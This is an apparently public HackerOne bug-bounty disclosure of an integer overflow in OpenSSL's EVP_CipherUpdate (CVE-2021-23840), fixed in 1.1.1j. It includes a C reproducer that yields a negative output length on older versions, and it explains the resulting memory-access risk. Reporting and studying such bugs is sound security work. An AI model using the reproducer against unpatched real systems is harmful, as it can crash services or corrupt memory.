# Integer overflow in CipherUpdate

## Report Details
- **Report ID**: 1113025
- **URL**: https://hackerone.com/reports/1113025
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-02-27T21:14:37.581Z
- **Disclosed**: 2021-04-08T03:55:44.706Z

## Reporter
- **Username**: reaperhulk
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
## Summary:
I reported an integer overflow to the OpenSSL security list on Dec 13, 2020 and it was fixed in OpenSSL 1.1.1j. Reporting it here for the bounty. It was assigned CVE-2021-23840 (https://nvd.nist.gov/vuln/detail/CVE-2021-23840) which NVD rated CVSS 7.5. Amusingly, the same bug (worked around by my library pyca/cryptography before 1.1.1j was released) was assigned CVE-2020-36242 (https://nvd.nist.gov/vuln/detail/CVE-2020-36242), which received a 9.1 CVSS from NVD.

## Steps To Reproduce:
The below is a reproducer for prior to 1.1.1j.
```
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <openssl/evp.h>

int main() {
    int res;
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    assert(ctx != NULL);
    unsigned char key[] = "0000000000000000";
    unsigned char iv[] = "0000000000000000";
    res = EVP_CipherInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv, 1);
    assert(res == 1);
    int intmax = 2147483647;
    void *inbuf = malloc(intmax);
    void *outbuf = malloc((size_t)2147483648);
    int outlen = 0;
    unsigned char data[] = "0";
    res = EVP_CipherUpdate(ctx, outbuf, &outlen, data, 1);
    printf("Processed %i bytes, outlen: %i, res: %i\n", 1, outlen, res);
    assert(res == 1);
    outlen = 0;
    res = EVP_CipherUpdate(ctx, outbuf, &outlen, (unsigned char
*)inbuf, intmax);
    assert(res == 1);
    printf("Processed %i bytes, outlen: %i, res: %i\n", intmax, outlen, res);
}
```

## Impact

This returned negative output length, which, when combined with common use of pointer arithmetic in buffers results in accessing incorrect regions of memory (typically this would manifest as a segfault due to the size of the negative value, but that is not guaranteed).

## Attachments
No attachments
